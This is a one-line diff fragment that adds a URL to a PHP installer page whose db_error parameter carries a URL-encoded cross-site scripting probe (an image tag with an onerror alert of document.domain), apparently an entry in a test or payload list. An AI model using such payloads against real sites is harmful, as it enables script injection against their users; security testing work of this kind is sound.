@@ -1,0 +1,1 @@
+/install/index.php?step=database_config&db_error=<img%20src=x%20onerror=alert(document.domain)%20/>
